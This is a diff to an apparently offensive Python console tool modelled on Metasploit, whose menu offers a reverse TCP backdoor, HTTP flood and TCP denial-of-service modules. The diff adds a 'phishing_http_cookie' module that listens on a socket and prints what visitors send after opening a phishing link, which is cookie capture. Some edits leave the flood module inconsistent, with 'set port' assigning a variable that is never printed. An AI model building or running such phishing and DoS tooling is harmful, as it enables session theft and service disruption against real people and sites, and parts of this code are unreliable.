@@ -1,5 +1,3 @@
-import aiohttp
-import asyncio
 import colorama
 import ftplib
 import os 
@@ -9,6 +7,9 @@ import socket
 import sys
 import threading
 import random
+import asyncio
+import aiohttp
+
 from colorama import Fore
 from colorama import Style
 
@@ -24,7 +25,7 @@ set_threads = 'null'
 
 colorama.init()
 
-os.system('cls' if os.name == 'nt' else 'clear')
+os.system('cls')
 
 main = [
 	f'''{Fore.YELLOW}
@@ -109,6 +110,7 @@ while True:
    MODULE                          OPTIONS
 ------------------------------------------------
 reverse_tcp_backdoor       created Backdoor File
+phishing_http_cookie       created link phishing cookie
 http_flood                 HTTP FLood Attack (DoS)
 http_dos_attack            DoS Attack
 http_tcp_dos               DoS Layer4 (TCP)
@@ -298,6 +300,99 @@ connection()
 
 # ==============================================================================================================
 
+		if set_module == 'phishing_http_cookie':
+			
+			print("")
+			print(Fore.GREEN + '[*]' + Style.RESET_ALL + f' set module => {set_module}')
+			print("")
+
+			while True:
+				module = input(f"vmsf6({set_module}) > ")
+
+
+				if module == 'exit module':
+					print("")
+					print("[+] Back module")
+					print("")
+					break
+
+				elif module == 'help':
+					def helping1():
+						print('''
+------------------------------------------------
+  Command                      Options
+------------------------------------------------
+ options                    show options
+ set host                   update host system
+ set port                   update port system 
+ exploit                    start exploit
+ exit module                exit module
+ help                       command for helping
+-----------------------------------------------
+ ''')
+
+					helping1()
+
+				elif module == 'set host':
+					host_ip = input("[+] HOST : ")
+					print(Fore.BLUE + '[*]' + Style.RESET_ALL + f" set host => {host_ip}")
+
+				elif module == 'set port':
+					port_ip = input("[+] PORT : ")
+					print(Fore.BLUE + '[*]' + Style.RESET_ALL + f" set PORT => {port_ip}")
+
+				elif module == 'options':
+					def options():
+						print(f'''
+------------------------------------------------
+   	               OPTIONS
+------------------------------------------------
+   HOST       :  {host_ip}       
+   PORT       :  {port_ip}
+   URL        :  http://{host_ip}:{port_ip}/
+   PAYLOAD    :  {set_module}
+-----------------------------------------------
+''')
+					options()
+
+				elif module == 'exploit':
+					import socket
+					import sys 
+
+					HOST = str(f'{host_ip}')
+					PORT = int(port_ip)
+
+					def listening():
+						for i in range(2):
+							s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+							s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 100)
+							s.bind((HOST, PORT))
+							s.listen(100)
+
+							print(Fore.GREEN + '[*]' + Style.RESET_ALL + f' Start Session On http://{HOST}:{PORT}')
+							time.sleep(2)
+							print(Fore.GREEN + '[*]' + Style.RESET_ALL + f' http://{HOST}:{PORT} listening...')
+							
+							conn, addr = s.accept()
+							
+							print(Fore.GREEN + '[*]' + Style.RESET_ALL + f' 1 {addr} has open the link...')
+							time.sleep(2)
+
+							output_data = conn.recv(1024)
+
+							print("")
+							print(Fore.GREEN + '[*]' + Style.RESET_ALL + f' {output_data}')
+							print("")
+
+							session = True
+						print("")
+						print("[+] Session CLosed")
+						print("")
+						
+					listening()
+
+# =========================================================================================
+		
 
 		elif set_module == 'http_flood':
 
@@ -317,8 +412,8 @@ connection()
   Command                      Options
 ------------------------------------------------
  options                    show options
- set url                    Update Url
- set num                    Update Num Packet
+ set url                    Update URL
+ set num                    Update NUM
  exploit                    start exploit
  exit module                exit module
  help                       command for helping
@@ -334,11 +429,11 @@ connection()
 					break
 
 				elif module == 'set url':
-					set_url = input("URL : ")
+					set_url = input("HOST : ")
 					print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' set URL => {set_url}')
 
-				elif module == 'set num':
-					set_num = input("NUM : ")
+				elif module == 'set port':
+					set_NUM = input("NUM : ")
 					print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' set NUM => {set_num}')
 
 				elif module == 'options':
